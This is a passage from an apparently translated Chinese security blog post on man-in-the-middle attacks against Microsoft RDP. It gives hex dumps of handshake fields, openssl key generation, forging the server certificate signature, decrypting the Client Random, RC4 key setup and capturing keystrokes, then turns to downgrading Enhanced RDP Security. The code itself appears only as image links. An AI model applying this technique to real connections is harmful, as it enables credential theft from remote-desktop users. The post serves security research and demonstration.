00000080:&nbsp;AA&nbsp;D6&nbsp;F6&nbsp;80&nbsp;EB&nbsp;0B&nbsp;3E&nbsp;1D&nbsp;8D&nbsp;30&nbsp;B3&nbsp;AB&nbsp;6A&nbsp;AE&nbsp;26&nbsp;07&nbsp;......&gt;..0..j.&amp;.
00000090:&nbsp;EF&nbsp;89&nbsp;3D&nbsp;CB&nbsp;15&nbsp;98&nbsp;AE&nbsp;22&nbsp;7E&nbsp;4B&nbsp;2B&nbsp;AF&nbsp;07&nbsp;01&nbsp;00&nbsp;00&nbsp;..=....&quot;~K+.....
000000A0:&nbsp;00&nbsp;01&nbsp;00&nbsp;00&nbsp;00&nbsp;01&nbsp;00&nbsp;00&nbsp;00&nbsp;06&nbsp;00&nbsp;1C&nbsp;01&nbsp;52&nbsp;53&nbsp;41&nbsp;.............RSA
000000B0:&nbsp;31&nbsp;08&nbsp;01&nbsp;00&nbsp;00&nbsp;00&nbsp;08&nbsp;00&nbsp;00&nbsp;FF&nbsp;00&nbsp;00&nbsp;00&nbsp;01&nbsp;00&nbsp;01&nbsp;1...............
000000C0:&nbsp;00&nbsp;AF&nbsp;92&nbsp;E8&nbsp;20&nbsp;AC&nbsp;D5&nbsp;F7&nbsp;BB&nbsp;9F&nbsp;CF&nbsp;6F&nbsp;6E&nbsp;2C&nbsp;63&nbsp;07&nbsp;....&nbsp;......on,c.
000000D0:&nbsp;34&nbsp;CC&nbsp;A7&nbsp;7A&nbsp;21&nbsp;AB&nbsp;29&nbsp;8A&nbsp;1B&nbsp;5D&nbsp;FE&nbsp;FD&nbsp;43&nbsp;F1&nbsp;10&nbsp;FC&nbsp;4..z!.)..]..C...
000000E0:&nbsp;DB&nbsp;C6&nbsp;D6&nbsp;4B&nbsp;F1&nbsp;B7&nbsp;E1&nbsp;B9&nbsp;5E&nbsp;F7&nbsp;68&nbsp;46&nbsp;58&nbsp;EF&nbsp;09&nbsp;39&nbsp;...K....^.hFX..9
000000F0:&nbsp;08&nbsp;03&nbsp;0F&nbsp;54&nbsp;0C&nbsp;58&nbsp;FA&nbsp;3E&nbsp;A3&nbsp;4A&nbsp;50&nbsp;F6&nbsp;91&nbsp;E9&nbsp;41&nbsp;F8&nbsp;...T.X.&gt;.JP...A.
00000100:&nbsp;89&nbsp;1D&nbsp;CC&nbsp;14&nbsp;3C&nbsp;64&nbsp;0B&nbsp;1D&nbsp;2B&nbsp;0C&nbsp;98&nbsp;DF&nbsp;63&nbsp;D6&nbsp;A6&nbsp;72&nbsp;....&lt;d..+...c..r
00000110:&nbsp;42&nbsp;ED&nbsp;AC&nbsp;CB&nbsp;88&nbsp;44&nbsp;85&nbsp;47&nbsp;D3&nbsp;89&nbsp;45&nbsp;BA&nbsp;BD&nbsp;9F&nbsp;2D&nbsp;D0&nbsp;B....D.G..E...-.
00000120:&nbsp;D5&nbsp;0E&nbsp;24&nbsp;09&nbsp;AD&nbsp;02&nbsp;2B&nbsp;9D&nbsp;37&nbsp;18&nbsp;DD&nbsp;12&nbsp;8B&nbsp;F6&nbsp;21&nbsp;5B&nbsp;..$...+.7.....![
00000130:&nbsp;20&nbsp;47&nbsp;33&nbsp;52&nbsp;9C&nbsp;00&nbsp;32&nbsp;BA&nbsp;E7&nbsp;83&nbsp;80&nbsp;7F&nbsp;AA&nbsp;3C&nbsp;F3&nbsp;C7&nbsp;G3R..2......&lt;..
00000140:&nbsp;95&nbsp;DD&nbsp;84&nbsp;C2&nbsp;4E&nbsp;5E&nbsp;0C&nbsp;27&nbsp;52&nbsp;74&nbsp;FC&nbsp;87&nbsp;0E&nbsp;10&nbsp;D9&nbsp;42&nbsp;....N^.&#39;Rt.....B
00000150:&nbsp;19&nbsp;0D&nbsp;F5&nbsp;77&nbsp;57&nbsp;3F&nbsp;71&nbsp;4F&nbsp;9C&nbsp;34&nbsp;0F&nbsp;12&nbsp;F8&nbsp;E8&nbsp;B0&nbsp;59&nbsp;...wW?qO.4.....Y
00000160:&nbsp;F7&nbsp;CD&nbsp;09&nbsp;F9&nbsp;A5&nbsp;25&nbsp;AE&nbsp;6A&nbsp;CB&nbsp;E6&nbsp;CB&nbsp;88&nbsp;24&nbsp;DA&nbsp;D2&nbsp;46&nbsp;.....%.j....$..F
00000170:&nbsp;42&nbsp;21&nbsp;21&nbsp;94&nbsp;2E&nbsp;6D&nbsp;42&nbsp;FF&nbsp;9F&nbsp;AF&nbsp;89&nbsp;E3&nbsp;BA&nbsp;EC&nbsp;CC&nbsp;DA&nbsp;B!!..mB.........
00000180:&nbsp;15&nbsp;71&nbsp;5D&nbsp;17&nbsp;A9&nbsp;5A&nbsp;00&nbsp;59&nbsp;D4&nbsp;AD&nbsp;EA&nbsp;E4&nbsp;93&nbsp;58&nbsp;06&nbsp;5B&nbsp;.q]..Z.Y.....X.[
00000190:&nbsp;F7&nbsp;22&nbsp;2A&nbsp;1F&nbsp;DD&nbsp;DC&nbsp;C6&nbsp;27&nbsp;30&nbsp;2A&nbsp;25&nbsp;10&nbsp;B1&nbsp;A8&nbsp;40&nbsp;98&nbsp;.&quot;*....&#39;0*%...@.
000001A0:&nbsp;6B&nbsp;24&nbsp;B6&nbsp;4E&nbsp;2A&nbsp;79&nbsp;B7&nbsp;40&nbsp;27&nbsp;F4&nbsp;BE&nbsp;07&nbsp;35&nbsp;80&nbsp;50&nbsp;48&nbsp;k$.N*y.@&#39;...5.PH
000001B0:&nbsp;72&nbsp;A4&nbsp;0D&nbsp;2B&nbsp;AA&nbsp;B0&nbsp;5C&nbsp;89&nbsp;C0&nbsp;96&nbsp;2A&nbsp;49&nbsp;1E&nbsp;BC&nbsp;A1&nbsp;AB&nbsp;r..+..\...*I....
000001C0:&nbsp;D0&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;08&nbsp;00&nbsp;48&nbsp;00&nbsp;3D&nbsp;5F&nbsp;11&nbsp;...........H.=_.
000001D0:&nbsp;A1&nbsp;C1&nbsp;38&nbsp;09&nbsp;1B&nbsp;B1&nbsp;85&nbsp;52&nbsp;1E&nbsp;D1&nbsp;03&nbsp;A1&nbsp;1E&nbsp;35&nbsp;E7&nbsp;49&nbsp;..8....R.....5.I
000001E0:&nbsp;CC&nbsp;25&nbsp;C3&nbsp;3C&nbsp;6B&nbsp;98&nbsp;77&nbsp;C2&nbsp;87&nbsp;03&nbsp;C4&nbsp;F5&nbsp;78&nbsp;09&nbsp;78&nbsp;F1&nbsp;.%.&lt;k.w.....x.x.
000001F0:&nbsp;43&nbsp;21&nbsp;07&nbsp;BD&nbsp;AB&nbsp;EE&nbsp;8E&nbsp;B0&nbsp;F6&nbsp;BC&nbsp;FC&nbsp;B0&nbsp;A6&nbsp;6A&nbsp;DD&nbsp;49&nbsp;C!...........j.I
00000200:&nbsp;A0&nbsp;F1&nbsp;39&nbsp;86&nbsp;FE&nbsp;F1&nbsp;1E&nbsp;36&nbsp;3C&nbsp;CE&nbsp;69&nbsp;C0&nbsp;62&nbsp;00&nbsp;00&nbsp;00&nbsp;..9....6&lt;.i.b...
00000210:&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;.....</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我高亮显示了代表公钥的相关字节。在其前面的两个字节的内容是以小端字节顺序（0x011c）表示的公钥长度。正如我们之前讨论的那样，公钥由模数和公钥指数组成。有关此数据结构的详细信息，请阅读RDP的相关规范[10]。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">让我们来看看我们感兴趣的信息。下面是模数：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">00000000:&nbsp;AF92&nbsp;E820&nbsp;ACD5&nbsp;F7BB&nbsp;9FCF&nbsp;6F6E&nbsp;2C63&nbsp;0734&nbsp;...&nbsp;......on,c.4
00000010:&nbsp;CCA7&nbsp;7A21&nbsp;AB29&nbsp;8A1B&nbsp;5DFE&nbsp;FD43&nbsp;F110&nbsp;FCDB&nbsp;..z!.)..]..C....
00000020:&nbsp;C6D6&nbsp;4BF1&nbsp;B7E1&nbsp;B95E&nbsp;F768&nbsp;4658&nbsp;EF09&nbsp;3908&nbsp;..K....^.hFX..9.
00000030:&nbsp;030F&nbsp;540C&nbsp;58FA&nbsp;3EA3&nbsp;4A50&nbsp;F691&nbsp;E941&nbsp;F889&nbsp;..T.X.&gt;.JP...A..
00000040:&nbsp;1DCC&nbsp;143C&nbsp;640B&nbsp;1D2B&nbsp;0C98&nbsp;DF63&nbsp;D6A6&nbsp;7242&nbsp;...&lt;d..+...c..rB
00000050:&nbsp;EDAC&nbsp;CB88&nbsp;4485&nbsp;47D3&nbsp;8945&nbsp;BABD&nbsp;9F2D&nbsp;D0D5&nbsp;....D.G..E...-..
00000060:&nbsp;0E24&nbsp;09AD&nbsp;022B&nbsp;9D37&nbsp;18DD&nbsp;128B&nbsp;F621&nbsp;5B20&nbsp;.$...+.7.....![
00000070:&nbsp;4733&nbsp;529C&nbsp;0032&nbsp;BAE7&nbsp;8380&nbsp;7FAA&nbsp;3CF3&nbsp;C795&nbsp;G3R..2......&lt;...
00000080:&nbsp;DD84&nbsp;C24E&nbsp;5E0C&nbsp;2752&nbsp;74FC&nbsp;870E&nbsp;10D9&nbsp;4219&nbsp;...N^.&#39;Rt.....B.
00000090:&nbsp;0DF5&nbsp;7757&nbsp;3F71&nbsp;4F9C&nbsp;340F&nbsp;12F8&nbsp;E8B0&nbsp;59F7&nbsp;..wW?qO.4.....Y.
000000A0:&nbsp;CD09&nbsp;F9A5&nbsp;25AE&nbsp;6ACB&nbsp;E6CB&nbsp;8824&nbsp;DAD2&nbsp;4642&nbsp;....%.j....$..FB
000000B0:&nbsp;2121&nbsp;942E&nbsp;6D42&nbsp;FF9F&nbsp;AF89&nbsp;E3BA&nbsp;ECCC&nbsp;DA15&nbsp;!!..mB..........
000000C0:&nbsp;715D&nbsp;17A9&nbsp;5A00&nbsp;59D4&nbsp;ADEA&nbsp;E493&nbsp;5806&nbsp;5BF7&nbsp;q]..Z.Y.....X.[.
000000D0:&nbsp;222A&nbsp;1FDD&nbsp;DCC6&nbsp;2730&nbsp;2A25&nbsp;10B1&nbsp;A840&nbsp;986B&nbsp;&quot;*....&#39;0*%...@.k
000000E0:&nbsp;24B6&nbsp;4E2A&nbsp;79B7&nbsp;4027&nbsp;F4BE&nbsp;0735&nbsp;8050&nbsp;4872&nbsp;$.N*y.@&#39;...5.PHr
000000F0:&nbsp;A40D&nbsp;2BAA&nbsp;B05C&nbsp;89C0&nbsp;962A&nbsp;491E&nbsp;BCA1&nbsp;ABD0&nbsp;..+..\...*I.....
00000100:&nbsp;0000&nbsp;0000&nbsp;0000&nbsp;0000&nbsp;........</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">签名是：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">00000000:&nbsp;3D5F&nbsp;11A1&nbsp;C138&nbsp;091B&nbsp;B185&nbsp;521E&nbsp;D103&nbsp;A11E&nbsp;=_...8....R.....
00000010:&nbsp;35E7&nbsp;49CC&nbsp;25C3&nbsp;3C6B&nbsp;9877&nbsp;C287&nbsp;03C4&nbsp;F578&nbsp;5.I.%.&lt;k.w.....x
00000020:&nbsp;0978&nbsp;F143&nbsp;2107&nbsp;BDAB&nbsp;EE8E&nbsp;B0F6&nbsp;BCFC&nbsp;B0A6&nbsp;.x.C!...........
00000030:&nbsp;6ADD&nbsp;49A0&nbsp;F139&nbsp;86FE&nbsp;F11E&nbsp;363C&nbsp;CE69&nbsp;C062&nbsp;j.I..9....6&lt;.i.b
00000040:&nbsp;0000&nbsp;0000&nbsp;0000&nbsp;0000&nbsp;........</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">Server Random是：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">00000000:&nbsp;D95E&nbsp;A3AA&nbsp;D6F6&nbsp;80EB&nbsp;0B3E&nbsp;1D8D&nbsp;30B3&nbsp;AB6A&nbsp;.^.......&gt;..0..j
00000010:&nbsp;AE26&nbsp;07EF&nbsp;893D&nbsp;CB15&nbsp;98AE&nbsp;227E&nbsp;4B2B&nbsp;AF07&nbsp;.&amp;...=....&quot;~K+..</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这些都是以小端字节顺序排列的。我们要留心记下Server Random，并替换其他两个值。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">为了生成我们的RSA密钥，我们将使用openssl。我知道有一个处理RSA的Python库，但它比openssl的速度要慢得多。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;openssl&nbsp;genrsa&nbsp;512&nbsp;|&nbsp;openssl&nbsp;rsa&nbsp;-noout&nbsp;-text
Generating&nbsp;RSA&nbsp;private&nbsp;key,&nbsp;512&nbsp;bit&nbsp;long&nbsp;modulus
.....++++++++++++
..++++++++++++
e&nbsp;is&nbsp;65537&nbsp;(0x010001)
Private-Key:&nbsp;(512&nbsp;bit)
modulus:
00:f8:4c:16:d5:6c:75:96:65:b3:42:83:ee:26:f7:
e6:8a:55:89:b0:61:6e:3e:ea:e0:d3:27:1c:bc:88:
81:48:29:d8:ff:39:18:d9:28:3d:29:e1:bf:5a:f1:
21:2a:9a:b8:b1:30:0f:4c:70:0a:d3:3c:e7:98:31:
64:b4:98:1f:d7
publicExponent:&nbsp;65537&nbsp;(0x10001)
privateExponent:
00:b0:c1:89:e7:b8:e4:24:82:95:90:1e:57:25:0a:
88:e5:a5:6a:f5:53:06:a6:67:92:50:fe:a0:e8:5d:
cc:9a:cf:38:9b:5f:ee:50:20:cf:10:0c:9b:e1:ee:
05:94:9a:16:e9:82:e2:55:48:69:1d:e8:dd:5b:c2:
8a:f6:47:38:c1
prime1:
[...]</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这里我们可以看到模数n、公钥指数e和私钥指数d。它们是使用大端字节顺序的十六进制数字表示的。我们实际上需要一个2048位的密钥，而不是512位的，但道理您应该清楚了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">伪造签名很容易。我们取证书的前六个字段的MD5哈希值，根据规范添加一些常量[11]，然后用终端服务密钥[8]的私有部分进行加密。具体可以利用下列Python代码来完成：&nbsp;</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><img src="http://p2.qhimg.com/t017791f8800ea7f554.png" title="t017791f8800ea7f554.png" alt="http://p2.qhimg.com/t017791f8800ea7f554.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们需要拦截的下一个消息是包含加密的Client Random的消息。它看起来如下所示：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">From&nbsp;client:
00000000:&nbsp;03&nbsp;00&nbsp;01&nbsp;1F&nbsp;02&nbsp;F0&nbsp;80&nbsp;64&nbsp;00&nbsp;08&nbsp;03&nbsp;EB&nbsp;70&nbsp;81&nbsp;10&nbsp;01&nbsp;.......d....p...
00000010:&nbsp;02&nbsp;00&nbsp;00&nbsp;08&nbsp;01&nbsp;00&nbsp;00&nbsp;DD&nbsp;8A&nbsp;43&nbsp;35&nbsp;DD&nbsp;1A&nbsp;12&nbsp;99&nbsp;44&nbsp;.........C5....D
00000020:&nbsp;A1&nbsp;3E&nbsp;F5&nbsp;38&nbsp;5C&nbsp;DB&nbsp;3F&nbsp;3F&nbsp;40&nbsp;D1&nbsp;ED&nbsp;C4&nbsp;A9&nbsp;3B&nbsp;60&nbsp;6A&nbsp;.&gt;.8\.??@....;`j
00000030:&nbsp;A6&nbsp;10&nbsp;5A&nbsp;AF&nbsp;FD&nbsp;17&nbsp;7A&nbsp;21&nbsp;43&nbsp;69&nbsp;D0&nbsp;F8&nbsp;9B&nbsp;F1&nbsp;21&nbsp;A3&nbsp;..Z...z!Ci....!.
00000040:&nbsp;F1&nbsp;49&nbsp;C6&nbsp;80&nbsp;96&nbsp;03&nbsp;62&nbsp;BF&nbsp;43&nbsp;54&nbsp;9D&nbsp;38&nbsp;4D&nbsp;68&nbsp;75&nbsp;8C&nbsp;.I....b.CT.8Mhu.
00000050:&nbsp;EA&nbsp;A1&nbsp;69&nbsp;23&nbsp;2F&nbsp;F6&nbsp;E9&nbsp;3B&nbsp;E7&nbsp;E0&nbsp;48&nbsp;A1&nbsp;B8&nbsp;6B&nbsp;E2&nbsp;D7&nbsp;..i#/..;..H..k..
00000060:&nbsp;E2&nbsp;49&nbsp;B1&nbsp;B2&nbsp;1B&nbsp;BF&nbsp;BA&nbsp;D9&nbsp;65&nbsp;0B&nbsp;34&nbsp;5A&nbsp;B0&nbsp;10&nbsp;73&nbsp;6E&nbsp;.I......e.4Z..sn
00000070:&nbsp;4F&nbsp;15&nbsp;FA&nbsp;D7&nbsp;04&nbsp;CA&nbsp;5C&nbsp;E5&nbsp;E2&nbsp;87&nbsp;87&nbsp;ED&nbsp;55&nbsp;0F&nbsp;00&nbsp;45&nbsp;O.....\.....U..E
00000080:&nbsp;65&nbsp;2C&nbsp;C6&nbsp;1A&nbsp;4C&nbsp;09&nbsp;6F&nbsp;27&nbsp;44&nbsp;54&nbsp;FE&nbsp;B6&nbsp;02&nbsp;1C&nbsp;BA&nbsp;9F&nbsp;e,..L.o&#39;DT......
00000090:&nbsp;3B&nbsp;D8&nbsp;D0&nbsp;8D&nbsp;A5&nbsp;E6&nbsp;93&nbsp;45&nbsp;0C&nbsp;9B&nbsp;68&nbsp;36&nbsp;5C&nbsp;93&nbsp;16&nbsp;79&nbsp;;......E..h6\..y
000000A0:&nbsp;0B&nbsp;B8&nbsp;19&nbsp;BF&nbsp;88&nbsp;08&nbsp;5D&nbsp;AC&nbsp;19&nbsp;85&nbsp;7C&nbsp;BB&nbsp;AA&nbsp;66&nbsp;C4&nbsp;D9&nbsp;......]...|..f..
000000B0:&nbsp;8E&nbsp;C3&nbsp;11&nbsp;ED&nbsp;F3&nbsp;8D&nbsp;27&nbsp;60&nbsp;8A&nbsp;08&nbsp;E0&nbsp;B1&nbsp;20&nbsp;1D&nbsp;08&nbsp;9A&nbsp;......&#39;`....&nbsp;...
000000C0:&nbsp;97&nbsp;44&nbsp;6D&nbsp;33&nbsp;23&nbsp;0E&nbsp;5C&nbsp;73&nbsp;D4&nbsp;02&nbsp;4C&nbsp;20&nbsp;97&nbsp;5C&nbsp;C9&nbsp;F6&nbsp;.Dm3#.\s..L&nbsp;.\..
000000D0:&nbsp;6D&nbsp;31&nbsp;B2&nbsp;70&nbsp;35&nbsp;39&nbsp;37&nbsp;A4&nbsp;C2&nbsp;52&nbsp;62&nbsp;C7&nbsp;5A&nbsp;69&nbsp;54&nbsp;44&nbsp;m1.p597..Rb.ZiTD
000000E0:&nbsp;4C&nbsp;4A&nbsp;75&nbsp;D2&nbsp;63&nbsp;CC&nbsp;52&nbsp;15&nbsp;8F&nbsp;6E&nbsp;2A&nbsp;D8&nbsp;0D&nbsp;61&nbsp;A5&nbsp;0A&nbsp;LJu.c.R..n*..a..
000000F0:&nbsp;47&nbsp;5B&nbsp;2A&nbsp;68&nbsp;97&nbsp;7B&nbsp;1B&nbsp;FF&nbsp;D3&nbsp;33&nbsp;10&nbsp;49&nbsp;15&nbsp;9A&nbsp;D6&nbsp;2C&nbsp;G[*h.{...3.I...,
00000100:&nbsp;DF&nbsp;04&nbsp;6D&nbsp;93&nbsp;21&nbsp;78&nbsp;32&nbsp;98&nbsp;8B&nbsp;0B&nbsp;F4&nbsp;01&nbsp;33&nbsp;FB&nbsp;CC&nbsp;5B&nbsp;..m.!x2.....3..[
00000110:&nbsp;83&nbsp;BA&nbsp;2D&nbsp;7F&nbsp;EA&nbsp;82&nbsp;3B&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;..-...;........</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">同样，这里也高亮显示了加密的Client Random，其中前面的四个字节表示其长度（0x0108）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">由于它是用我们的证书来加密的，那么自然可以轻松解密了：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">00000000:&nbsp;4bbd&nbsp;f97d&nbsp;49b6&nbsp;8996&nbsp;ec45&nbsp;0ce0&nbsp;36e3&nbsp;d170&nbsp;K..}I....E..6..p
00000010:&nbsp;65a8&nbsp;f962&nbsp;f487&nbsp;5f27&nbsp;cd1f&nbsp;294b&nbsp;2630&nbsp;74e4&nbsp;e..b.._&#39;..)K&amp;0t.</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我们只需要使用服务器的公钥重新加密它，并在传递它之前进行相应的替换即可。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">不幸的是，事情还没有结束。我们现在知道了秘密的Client Random，但不知道什么原因，微软并没有单纯用它作为对称密钥。有一个精心制作程序[6]可以导出客户端的加密密钥、服务器的加密密钥和签名密钥。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在导出会话密钥之后，我们可以初始化RC4流的s-box。由于RDP对于来自服务器的消息使用单独的密钥，而不是来自客户端的消息，因此我们需要两个s-box。s-box是一个256字节的数组，会根据密钥按照某种特定的方式进行重排。然后，s盒就会产生伪随机数流，用来与数据流进行异或处理。这个过程可以用下列Python代码完成：&nbsp;</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><img src="http://p3.qhimg.com/t01b9d91e8f9b3916fe.png" title="t01b9d91e8f9b3916fe.png" alt="http://p3.qhimg.com/t01b9d91e8f9b3916fe.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">正如你所看到的那样，协议要求密钥对4096个数据包加密后进行更新。但是这里我不打算实现这一点，因为我只是对凭证安全性的概念证明感兴趣，所以不想弄那么复杂。不过，如果读者学有余力的话，可以自行补上！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">现在，我们已经万事俱备，足以读取所有的流量了。我们对含有键盘输入事件（即按键和按键释放）信息的数据包特别感兴趣。我从规范[12]了解到，消息可以包含多个数据包，并有慢路径包（从0x03开始）和快路径包（第一个字节可被四整除）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">键盘输入事件[13]由两个字节组成，例如：&nbsp;</span></p><pre class="brush:plain;toolbar:false">1&nbsp;00000000:&nbsp;01&nbsp;1F&nbsp;..</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这意味着“S”键（0x1F）已被释放（因为第一个字节是0x01）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当然，这里的解析工作处理的不是很到位，因为有时鼠标移动事件会被识别为键盘事件。此外，scancode需要转换为虚拟键代码，这取决于键盘类型和键盘布局。这样做好像有点复杂，所以我没有这样做，而是直接采用了参考资料[14]中的方法。对于概念验证来说，这已经足够好了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">让我们试验一下。连接到我们的虚假RDP服务器后，我们收到警告说无法验证服务器的真实性：</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t01b775845a1c6f3a60.png" title="t019bff44a35e048ea3.png" alt="http://p7.qhimg.com/t019bff44a35e048ea3.png"/></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">图4：无法验证服务器的身份...</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">注意到了吗？这不是SSL的警告。但是无论如何，我们现在已经可以看到按键了（见图5）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">顺便说一下，这正是Cain所做的事情。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">攻陷增强型RDP安全协议&nbsp;</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">对我来说，降级到标准RDP安全协议是无法令人满意的。如果我是一个攻击者，我会尽量让攻击看起来不那么不显眼。在上面的情形中，受害人会注意到一个与平常不同的警告，并且在连接已经建立之后还必须输入其凭证。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当我使用Cain通过MitM方式攻击RDP连接时，要是没有看到相同的SSL警告的话，我会很不爽的。因为如果这个MitM工具会导致显示完全不同的警告的话，那么我就很难向客户解释为什么必须认真对待SSL警告，特别是当他们使用了未经验证的自签名证书的时候。</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01e2742527fabee89c.png" title="t019793e01a34f0968a.png" alt="http://p2.qhimg.com/t019793e01a34f0968a.png"/></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">图5：以明文显示的键盘输入事件。密码是Secr3t！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">因此，让我们尝试将连接降级为增强型RDP安全协议。为此，我们需要自己的自签名SSL证书，不过这可以由openssl生成：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;openssl&nbsp;req&nbsp;-new&nbsp;-newkey&nbsp;rsa：“$&nbsp;KEYLENGTH”-days“$&nbsp;DAYS”-nodes&nbsp;-x509&nbsp;\
-subj“$&nbsp;SUBJ”-keyout&nbsp;privatekey.key&nbsp;-out&nbsp;certificate.crt&nbsp;2&gt;&nbsp;/&nbsp;dev&nbsp;/&nbsp;null</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我们需要在正确的时间将我们的Python TCP套接字封装到SSL套接字中，这对于我们来说不成问题。我之前说过，标准的RDP协议使用了SSL隧道，但服务器总是选择“None”作为其加密级别。这简直太好了，因为可以安全地假设SSL封装器能确保数据的真实性和完整性。在SSL之上使用RC4是没有必要的，因为这就是在资源浪费。提取击键的工作方式与前一节完全相同。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">唯一多出来的安全功能就是服务器会对原始协议协商请求进行确认。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在建立SSL连接后，服务器会对客户端说：“顺便说一下，你告诉我这些是你能够处理的安全协议。”用二进制表示的话，它看起来像这样：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><br/></p><pre class="brush:plain;toolbar:false">From&nbsp;server:
00000000:&nbsp;03&nbsp;00&nbsp;00&nbsp;70&nbsp;02&nbsp;F0&nbsp;80&nbsp;7F&nbsp;66&nbsp;66&nbsp;0A&nbsp;01&nbsp;00&nbsp;02&nbsp;01&nbsp;00&nbsp;...p....ff......
00000010:&nbsp;30&nbsp;1A&nbsp;02&nbsp;01&nbsp;22&nbsp;02&nbsp;01&nbsp;03&nbsp;02&nbsp;01&nbsp;00&nbsp;02&nbsp;01&nbsp;01&nbsp;02&nbsp;01&nbsp;0...&quot;...........
00000020:&nbsp;00&nbsp;02&nbsp;01&nbsp;01&nbsp;02&nbsp;03&nbsp;00&nbsp;FF&nbsp;F8&nbsp;02&nbsp;01&nbsp;02&nbsp;04&nbsp;42&nbsp;00&nbsp;05&nbsp;.............B..
00000030:&nbsp;00&nbsp;14&nbsp;7C&nbsp;00&nbsp;01&nbsp;2A&nbsp;14&nbsp;76&nbsp;0A&nbsp;01&nbsp;01&nbsp;00&nbsp;01&nbsp;C0&nbsp;00&nbsp;4D&nbsp;..|..*.v.......M
